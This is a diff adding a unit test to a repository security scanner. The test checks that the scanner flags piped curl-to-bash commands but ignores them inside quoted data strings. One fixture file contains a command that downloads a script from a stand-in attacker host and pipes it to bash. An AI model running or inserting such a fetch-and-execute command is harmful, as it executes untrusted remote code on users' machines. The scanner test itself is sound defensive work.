@@ -634,6 +634,22 @@ describe('scanRepo', () => {
     expect(hits.find((f) => f.file === 'subst.sh')!.severity).toBe('critical');
   });
 
+  it('masks curl|sh spans inside quoted data strings but keeps interpreter-fed strings live (AG-RC-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'cases.sh'),
+      '#!/bin/sh\nrun_case "$B" ALLOW "commit dquote mentions curl|bash" \'git commit -m "curl | bash detection tightened"\'\n',
+    );
+    fs.writeFileSync(path.join(dir, 'wrapped.sh'), "#!/bin/sh\nbash -c 'curl -sSL https://evil.example/x.sh | bash'\n");
+    fs.writeFileSync(
+      path.join(dir, '.pre-commit-config.yaml'),
+      'repos:\n  - repo: local\n    hooks:\n      - id: qlty\n        entry: >-\n          bash -c "command -v qlty || echo \'install: curl https://qlty.sh | bash\'"\n        language: system\n',
+    );
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-RC-001');
+    expect(hits.find((f) => f.file === 'cases.sh')).toBeUndefined();
+    expect(hits.find((f) => f.file === 'wrapped.sh')!.severity).toBe('critical');
+    expect(hits.find((f) => f.file === '.pre-commit-config.yaml')).toBeUndefined();
+  });
+
   it('downgrades injection patterns quoted in inline code spans (AG-SK-001)', () => {
     fs.mkdirSync(path.join(dir, 'skills', 'taste'), { recursive: true });
     fs.writeFileSync(
